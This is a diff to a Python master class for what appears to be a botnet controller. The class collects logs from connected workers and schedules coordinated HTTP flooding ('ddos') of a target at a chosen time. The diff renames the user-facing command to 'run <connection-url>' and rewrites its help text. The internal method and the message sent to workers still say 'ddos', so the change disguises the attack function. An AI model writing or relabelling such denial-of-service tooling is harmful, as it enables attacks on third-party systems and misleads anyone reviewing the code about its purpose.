@@ -89,7 +89,6 @@ class Master:
             sleep(0.01)
         logging.info("Exiting master...")
 
-
     def __setup_socket(self):
         try:
             self.socket.bind((self.server_address, self.server_port)) #Bind socket address to localhost / 127.0.0.1:5000
@@ -170,8 +169,8 @@ class Master:
         data = "get_log" + " " + str(lines)
         self.__send_message_to_all(data)
 
-    def __ddos(self, input_msg: list):
-        ip = input_msg[1]  # Example "ddos 192.168.2.159 2019-11-10 19:52:28"
+    def __ddos(self, input_msg: list): # Example "run <db-connection-url>"
+        connection_url = input_msg[1]  # Example "ddos 192.168.2.159 2019-11-10 19:52:28"
         date = input_msg[2].split("-")  # Split msg[2] with "-" separator into date[0->2]
         hour = input_msg[3].split(":")  # Split msg[3] with ":" separator into hour[0->2]
         if len(hour) == 3 and len(date) == 3:
@@ -179,8 +178,8 @@ class Master:
                 date_time = datetime(int(date[0]), int(date[1]), int(date[2]), int(hour[0]), int(hour[1]),
                                      int(hour[2]))
                 if datetime.now() < date_time:
-                    data = "ddos" + " " + ip + " " + input_msg[2] + " " + input_msg[3]
-                    self.planned_attacks.append([ip, date_time, self.workers_connected])
+                    data = "ddos" + " " + connection_url + " " + input_msg[2] + " " + input_msg[3]
+                    self.planned_attacks.append([connection_url, date_time, self.workers_connected])
                     self.__send_message_to_all(data)
                 else:
                     print(">> Date must be in future!")
@@ -199,7 +198,7 @@ class Master:
         print("  - stop : Stop log recording on all connected workers.")
         print("  - get <lines> : Ask to workers to send the last <lines> of log file.")
         print(
-            "  - ddos <ip> <yyyy/mm/dd> <hh:mm:ss> : Ask to all workers to HTTP request <ip> on <date> at <time>.")
+            "  - run <connection-url> <yyyy/mm/dd> <hh:mm:ss> : Ask to all workers to HTTP request <connection-url> on <date> at <time>.")
         print("  - help : Print this help menu.")
         print("  - worker : Print addresses of connected workers.")
         print("  - attack : Print planed attack.")
